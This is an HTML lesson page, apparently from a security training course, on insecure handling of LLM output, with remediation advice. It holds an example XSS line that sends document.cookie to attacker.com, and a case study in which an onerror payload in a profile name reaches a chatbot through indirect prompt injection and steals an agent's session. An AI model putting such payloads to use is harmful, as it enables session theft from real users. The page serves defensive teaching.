<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
<head>
    <title>LLM02: Insecure Output Handling</title>
    <style type="text/css" media="screen">
		@import url( ../shared/style.css );
	</style>
	<script src="../shared/scormfunctions.js" type="text/javascript"></script>
	<script src="../shared/contentfunctions.js" type="text/javascript"></script>
</head>
<body>
<h1>LLM02: Insecure Output Handling</h1>

<p>Insecure Output Handling occurs when an application blindly trusts the output of an LLM without proper validation or sanitization before passing it to other systems or users. This can lead to traditional vulnerabilities like XSS, SQL injection, or remote code execution.</p>

<h2>2.1 The "Trusted Output" Fallacy</h2>
<p>Many developers assume that because the LLM is "part of their application," its output is safe. This is a dangerous assumption. Because LLMs can be manipulated through prompt injection, their output should be treated as **untrusted user input**.</p>

<h2>2.2 Common Vulnerability Scenarios</h2>
<ul>
    <li><strong>Cross-Site Scripting (XSS):</strong> If an LLM generates a response that is rendered in a web browser without escaping, an attacker can use prompt injection to cause the LLM to output malicious JavaScript.
        <br/><em>Example:</em> <code>&lt;script&gt;fetch('attacker.com?cookie=' + document.cookie)&lt;/script&gt;</code></li>
    <li><strong>SQL Injection:</strong> If an LLM's output is used to build a SQL query without parameterization, an attacker can use prompt injection to cause the model to output SQL commands that leak or delete data.</li>
    <li><strong>Remote Code Execution (RCE):</strong> If the LLM generates code (like Python or Bash) that is then automatically executed by the system, a malicious output can result in a full server compromise.</li>
</ul>

<h2>2.3 Remediation Strategies</h2>
<p>The core principle for defending against LLM02 is to never trust the model's output.
<ul>
    <li><strong>Zero Trust Architecture:</strong> Treat LLM output exactly as you would treat input from a public-facing API.</li>
    <li><strong>Output Encoding and Escaping:</strong> Always encode or escape LLM output before rendering it in HTML, using it in a SQL query, or passing it to a shell.</li>
    <li><strong>Sanitization:</strong> Use established libraries to strip potentially malicious tags or characters from the model's response.</li>
    <li><strong>Structured Outputs:</strong> Force the model to output in a structured format like JSON and validate the JSON against a strict schema. This makes it much harder for the model to "accidentally" output malicious code or scripts.</li>
    <li><strong>Sandboxing:</strong> If you must execute code generated by an LLM, run it in a highly restricted, isolated sandbox environment (like a Micro-VM) with no network access.</li>
</ul></p>

<h2>2.4 Case Study: The Malicious Chatbot</h2>
<p>A customer support chatbot was vulnerable to indirect prompt injection via a user's profile name. An attacker set their name to <code>&lt;img src=x onerror=alert(1)&gt;</code>. When a support agent viewed the "summary" of the attacker's request generated by the LLM, the malicious script executed in the agent's browser, allowing the attacker to steal the agent's session token.</p>

<p>By implementing rigorous output validation, you ensure that even if an attacker successfully injects a prompt, they cannot use the model's response to compromise other parts of your system.</p>

<script type="text/javascript">
</script>
</body>
</html>
